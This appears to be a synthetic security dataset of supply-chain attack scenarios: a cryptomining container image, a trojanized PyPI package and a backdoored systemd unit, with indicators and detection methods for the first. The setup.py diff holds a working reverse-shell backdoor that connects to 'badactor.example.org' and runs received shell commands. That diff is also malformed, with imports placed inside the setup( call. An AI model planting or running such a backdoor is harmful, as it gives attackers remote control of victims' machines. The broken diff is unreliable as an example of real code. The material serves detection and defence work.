samples.scenario: A compromised container image published by a third-party vendor introduces a cryptomining malware that runs covertly within enterprise Kubernetes clusters.

technical_data.dockerfile_snippet:
FROM alpine:3.12
RUN apk add --no-cache curl
ADD miner.sh /usr/local/bin/miner.sh
CMD ["/bin/sh", "/usr/local/bin/miner.sh"]
technical_data.k8s_pod_logs:
[INFO] Starting miner with pool stratum+tcp://pool.example.com:3333
[INFO] Connected to mining pool
[WARN] High CPU usage detected
technical_data.network_traffic: 10:22:11.345678 IP pod-xyz.namespace.svc.cluster.local.3333 > pool.example.com.3333: Flags [S], seq 123456, win 65535, length 0

indicators: Container image with unknown added scripts not declared in vendor documentation
Unexpected high CPU usage in Kubernetes pods after image deployment
Network connections from pods to known cryptomining pool addresses
Process trees showing mining binaries executed inside containers
SBOM does not list cryptomining components despite presence in container
samples.detection_method: Scan container images for unauthorized binaries; monitor resource usage patterns in Kubernetes clusters; inspect network traffic for mining pool protocols; validate SBOM against deployed container contents.

samples.scenario: Malicious modification of a trusted Python package distributed via PyPI by a compromised maintainer, adding a timer-triggered reverse shell backdoor executed on import.

technical_data.setup_py_diff:
diff --git a/setup.py b/setup.py
index 123abcd..456efgh 100644
--- a/setup.py
+++ b/setup.py
@@ -25,6 +25,15 @@ setup(
     name='trustedlib',
     version='1.2.3',
+
+import threading
+import socket
+import subprocess
+
+def backdoor():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('badactor.example.org', 5555))
+    while True:
+        cmd = s.recv(1024).decode('utf-8')
+        if cmd == 'exit': break
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = proc.communicate()
+        s.send(out + err)
+
+threading.Timer(10.0, backdoor).start()
)

samples.scenario: Compromise of a popular Linux distribution mirror causing a trusted system update package to include a trojanized systemd unit file enabling persistent remote access.

technical_data.systemd_unit_diff:
diff --git a/etc/systemd/system/cron.service b/etc/systemd/system/cron.service
index 7e8f9a0..c1d2e3f 100644
--- a/etc/systemd/system/cron.service
+++ b/etc/systemd/system/cron.service
@@ -1,9 +1,14 @@
 [Unit]
 Description=Regular cron job runner
-
+[Service]
+ExecStart=/usr/sbin/cron
+
+# Malicious override to start backdoor
+ExecStartPost=/usr/local/bin/.hidden_backdoor
+Restart=always
